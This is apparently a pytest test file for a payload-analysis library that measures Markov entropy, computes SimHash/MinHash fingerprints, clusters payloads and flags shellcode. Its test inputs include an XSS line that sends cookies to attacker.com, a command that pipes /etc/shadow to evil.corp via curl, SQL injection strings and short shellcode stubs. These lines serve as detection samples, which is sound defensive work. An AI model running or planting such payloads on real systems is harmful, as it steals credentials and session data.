"""Tests for Markov Transition Profiling, LSH SimHash/MinHash & Shellcode Heuristics."""

import json
import pytest
from payload_entropy_studio.markov_lsh import (
    analyze_markov_lsh_profile,
    build_markov_transition_matrix,
    calculate_hamming_distance,
    calculate_kl_divergence,
    calculate_ngram_frequencies,
    calculate_simhash_similarity,
    calculate_transition_entropy,
    cluster_payloads,
    compute_minhash,
    compute_simhash,
    detect_shellcode_heuristics,
    estimate_jaccard_similarity,
    simhash_hex,
)
from payload_entropy_studio.mcp_server import MCPServer
from payload_entropy_studio.cli import main


class TestMarkovAnalysis:
    """Test Markov transition and N-gram entropy computation."""

    def test_ngram_frequencies(self):
        text = "banana"
        # bigrams: ba, an, na, an, na -> total 5
        ngrams = calculate_ngram_frequencies(text, n=2)
        assert "an" in ngrams
        assert "na" in ngrams
        assert "ba" in ngrams
        assert ngrams["an"] == pytest.approx(0.4)
        assert ngrams["na"] == pytest.approx(0.4)
        assert ngrams["ba"] == pytest.approx(0.2)

    def test_markov_transition_matrix_row_stochastic(self):
        payload = "SELECT * FROM users WHERE id=1 UNION SELECT null, username FROM admin"
        matrix = build_markov_transition_matrix(payload)
        assert len(matrix) > 0

        # Each row of transition matrix should sum to ~1.0
        for b1, transitions in matrix.items():
            row_sum = sum(transitions.values())
            assert pytest.approx(row_sum, abs=1e-4) == 1.0

    def test_transition_entropy_repetitive_vs_random(self):
        # Repetitive payload: 'ABABABABABAB' -> deterministic transition A->B (1.0), B->A (1.0) -> entropy 0
        rep_payload = "ABAB" * 30
        h_rep = calculate_transition_entropy(rep_payload)
        assert pytest.approx(h_rep, abs=1e-3) == 0.0

        # Diverse code payload
        code_payload = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>"
        h_code = calculate_transition_entropy(code_payload)
        assert h_code > 1.0
        assert h_code > h_rep

    def test_kl_divergence(self):
        # Natural English text should have relatively low KL divergence against baseline
        eng = "The quick brown fox jumps over the lazy dog."
        kl_eng = calculate_kl_divergence(eng)

        # High non-printable binary / shellcode sequence
        shellcode_like = bytes(range(256))
        kl_bin = calculate_kl_divergence(shellcode_like)

        assert kl_bin > kl_eng


class TestLocalitySensitiveHashing:
    """Test SimHash and MinHash similarity and clustering."""

    def test_simhash_identity_and_hamming(self):
        p1 = "SELECT 1,2,username,password FROM accounts WHERE active=1"
        p2 = "SELECT 1,2,username,password FROM accounts WHERE active=1"
        sh1 = compute_simhash(p1)
        sh2 = compute_simhash(p2)

        assert sh1 == sh2
        assert calculate_hamming_distance(sh1, sh2) == 0
        assert calculate_simhash_similarity(sh1, sh2) == 1.0

    def test_simhash_near_duplicates(self):
        p1 = "SELECT 1,2,username,password FROM accounts WHERE active=1"
        p2 = "SELECT 1,2,username,password FROM accounts WHERE active=2"  # 1 char mutated
        p3 = "<script>alert(window.origin);</script>"                      # Totally different

        sh1 = compute_simhash(p1)
        sh2 = compute_simhash(p2)
        sh3 = compute_simhash(p3)

        sim_12 = calculate_simhash_similarity(sh1, sh2)
        sim_13 = calculate_simhash_similarity(sh1, sh3)

        # Near duplicates have high similarity
        assert sim_12 >= 0.80
        # Disparate payloads have significantly lower similarity
        assert sim_13 < 0.70

    def test_minhash_jaccard_estimation(self):
        p1 = "SELECT null, password FROM admin_users"
        p2 = "SELECT null, password FROM admin_users"
        sig1 = compute_minhash(p1, num_perm=32)
        sig2 = compute_minhash(p2, num_perm=32)

        assert len(sig1) == 32
        assert estimate_jaccard_similarity(sig1, sig2) == 1.0

        p3 = "cat /etc/shadow | curl -d @- http://evil.corp"
        sig3 = compute_minhash(p3, num_perm=32)
        assert estimate_jaccard_similarity(sig1, sig3) < 0.3

    def test_cluster_payloads(self):
        payloads = [
            "SELECT 1 FROM users WHERE id=1",
            "SELECT 1 FROM users WHERE id=2",
            "SELECT 1 FROM users WHERE id=3",
            "<svg onload=alert(1)>",
            "<svg onload=alert(2)>",
        ]
        clusters = cluster_payloads(payloads, similarity_threshold=0.85)
        # Should detect 2 distinct clusters (SQLi cluster and XSS cluster)
        assert len(clusters) == 2


class TestShellcodeHeuristics:
    """Test x86/x64 shellcode detection."""

    def test_clean_sql_no_shellcode(self):
        res = detect_shellcode_heuristics("SELECT * FROM users WHERE username='admin'")
        assert res["is_probable_shellcode"] is False
        assert res["score"] < 0.3
        assert res["nop_sled_detected"] is False

    def test_nop_sled_and_syscall_detection(self):
        # 16 standard NOPs (\x90) + x86_64 syscall (\x0f\x05)
        shellcode = b"\x90" * 16 + b"\x48\x31\xc0\x0f\x05"
        res = detect_shellcode_heuristics(shellcode)

        assert res["nop_sled_detected"] is True
        assert res["syscall_detected"] is True
        assert res["score"] >= 0.5
        assert res["is_probable_shellcode"] is True
        assert len(res["indicators"]) >= 2

    def test_getpc_call_pop_detection(self):
        # call $+5; pop eax: \xe8\x00\x00\x00\x00\x58
        stub = b"\x90" * 8 + b"\xe8\x00\x00\x00\x00\x58\xcd\x80"
        res = detect_shellcode_heuristics(stub)

        assert res["getpc_detected"] is True
        assert res["syscall_detected"] is True
        assert res["score"] >= 0.6


class TestMarkovLSHUnifiedReport:
    """Test analyze_markov_lsh_profile unified report."""

    def test_unified_report_to_dict(self):
        payload = "<img src=x onerror=prompt(document.domain)>"
        rep = analyze_markov_lsh_profile(payload)

        d = rep.to_dict()
        assert d["payload_length"] == len(payload)
        assert isinstance(d["transition_entropy"], float)
        assert isinstance(d["kl_divergence"], float)
        assert isinstance(d["simhash"], str)
        assert len(d["simhash"]) == 16
        assert isinstance(d["simhash_int"], int)
        assert isinstance(d["minhash_signature"], list)
        assert "top_bigrams" in d


class TestMCPServerIntegration:
    """Test new MCP server tools."""

    def test_mcp_markov_profile_tool(self):
        server = MCPServer()
        res = server.handle_tool_call(
            "payload_markov_profile",
            {"payload": "UNION SELECT 1,2,3--", "ngram_order": 2},
        )
        assert "content" in res
        data = json.loads(res["content"][0]["text"])
        assert "transition_entropy" in data
        assert "ngrams" in data

    def test_mcp_lsh_fingerprint_tool(self):
        server = MCPServer()
        res = server.handle_tool_call(
            "payload_lsh_fingerprint",
            {
                "payload": "UNION SELECT 1,2,3--",
                "compare_with": "UNION SELECT 1,2,4--",
            },
        )
        assert "content" in res
        data = json.loads(res["content"][0]["text"])
        assert "simhash" in data
        assert "comparison" in data
        assert data["comparison"]["simhash_similarity"] >= 0.75

    def test_mcp_detect_shellcode_tool(self):
        server = MCPServer()
        res = server.handle_tool_call(
            "payload_detect_shellcode",
            {"payload": "\\x90" * 16 + "\\x0f\\x05"},
        )
        assert "content" in res
        data = json.loads(res["content"][0]["text"])
        assert data["nop_sled_detected"] is True


class TestCLIIntegration:
    """Test CLI subcommands markov, lsh, and shellcode."""

    def test_cli_markov(self, capsys):
        rc = main(["markov", "SELECT * FROM users", "--order", "2", "--json"])
        assert rc == 0
        out, _ = capsys.readouterr()
        data = json.loads(out)
        assert "transition_entropy" in data

    def test_cli_lsh(self, capsys):
        rc = main(["lsh", "UNION SELECT 1", "--compare", "UNION SELECT 2", "--json"])
        assert rc == 0
        out, _ = capsys.readouterr()
        data = json.loads(out)
        assert "simhash" in data
        assert "comparison" in data

    def test_cli_shellcode(self, capsys):
        rc = main(["shellcode", "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xcd\\x80", "--json"])
        assert rc == 0
        out, _ = capsys.readouterr()
        data = json.loads(out)
        assert "score" in data
